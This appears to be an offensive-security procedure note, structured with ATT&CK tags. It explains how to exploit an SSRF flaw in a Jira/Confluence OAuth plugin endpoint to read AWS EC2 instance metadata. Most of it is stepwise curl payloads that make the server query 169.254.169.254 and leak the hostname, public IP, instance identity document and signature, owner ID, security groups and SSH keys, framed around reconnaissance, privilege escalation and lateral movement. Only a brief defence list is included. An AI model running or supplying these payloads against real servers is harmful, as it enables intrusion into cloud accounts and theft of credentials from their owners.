---
tags:
  - aws
  - metadata
  - information-disclosure
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-ssrf-aws-hostname]]'
  - '[[commands/curl-ssrf-aws-public-ip]]'
  - '[[commands/curl-ssrf-instance-document]]'
  - '[[commands/curl-ssrf-pkcs7-signature]]'
  - '[[commands/curl-ssrf-network-owner-id]]'
  - '[[commands/curl-ssrf-security-groups]]'
  - '[[commands/curl-ssrf-ssh-keys]]'
verified: false
platforms:
  - AWS
  - Cloud
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[System Information Discovery]]'
  - '[[Unsecured Credentials]]'
  - '[[Gather Victim Host Information]]'
updated_at: '2025-12-14T04:08:55.307Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: f4546e1f-d4b8-41a2-aa08-825f2bfd086e
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[System Information Discovery]]'
  - '[[Unsecured Credentials]]'
  - '[[Gather Victim Host Information]]'
---
# Retrieve-AWS-Instance-Metadata-via-SSRF

## Summary

This procedure uses SSRF to query the AWS Instance Metadata Service (IMDS) endpoints, extracting sensitive information such as hostnames, IPs, instance identities, security groups, and SSH keys from a compromised Jira/Confluence server.

## Description

Exploiting the SSRF in the OAuth Plugin, attackers force the server to request http://169.254.169.254 paths, leaking AWS configuration details. In the DoD context, this discloses account IDs, regions, and keys, enabling identity compromise and lateral movement. Requires confirmed SSRF; outcomes include full instance profiling.

## Requirements

1. Confirmed SSRF access via OAuth endpoint
2. Target on AWS EC2 with IMDSv1 enabled
3. Curl or similar for HTTP requests
4. Discovered MAC address from prior steps for network interfaces

## Defense

Defensive measures and detection strategies:

- Enforce IMDSv2 with session tokens
- Network segmentation to isolate metadata access
- Log and alert on metadata service queries from apps
- Rotate SSH keys and monitor for exposure
- Audit security group configurations regularly

## Objectives

1. Gather system and network information for reconnaissance
2. Extract credentials and keys for privilege escalation
3. Identify security configurations for exploitation

## Instructions

### Step 1: Fetch Hostname and Public IP

**Context**: Start with basic metadata to confirm access and profile the instance.

**Command** ([[commands/curl-ssrf-aws-hostname]]):
```bash
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/hostname"
```

> Returns internal hostname; follow with public IP using [[commands/curl-ssrf-aws-public-ip]]:
```bash
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/public-ipv4"
```
> Expected: Hostname and IP for targeting.

### Step 2: Extract Instance Document and Signature

**Context**: Retrieve detailed JSON identity and cryptographic signature.

**Command** ([[commands/curl-ssrf-instance-document]]):
```bash
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/dynamic/instance-identity/document"
```

> JSON with instanceId, accountId, etc.; then [[commands/curl-ssrf-pkcs7-signature]] for verification:
```bash
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/dynamic/instance-identity/pkcs7"
```
> Expected: Full instance profile.

### Step 3: Enumerate Network and Security Details

**Context**: Query interfaces for owner, groups, and keys using discovered MAC.

**Command** ([[commands/curl-ssrf-network-owner-id]]):
```bash
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/network/interfaces/macs/XX:XX:XX:XX:XX:XX/owner-id"
```

> Owner ID; continue with [[commands/curl-ssrf-security-groups]] and [[commands/curl-ssrf-ssh-keys]]:
```bash
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/network/interfaces/macs/XX:XX:XX:XX:XX:XX/security-groups"
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key"
```
> Expected: Groups and SSH keys leaked.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[System Information Discovery]] System Information Discovery
- [[Unsecured Credentials]] Unsecured Credentials
- [[Gather Victim Host Information]] Gather Victim Host Information

### Sub-Techniques

-

## Commands Used

- [[commands/curl-ssrf-aws-hostname]]
- [[commands/curl-ssrf-aws-public-ip]]
- [[commands/curl-ssrf-instance-document]]
- [[commands/curl-ssrf-pkcs7-signature]]
- [[commands/curl-ssrf-network-owner-id]]
- [[commands/curl-ssrf-security-groups]]
- [[commands/curl-ssrf-ssh-keys]]

## Tools Used

-

## Tags

- aws
- metadata
- ssh-keys
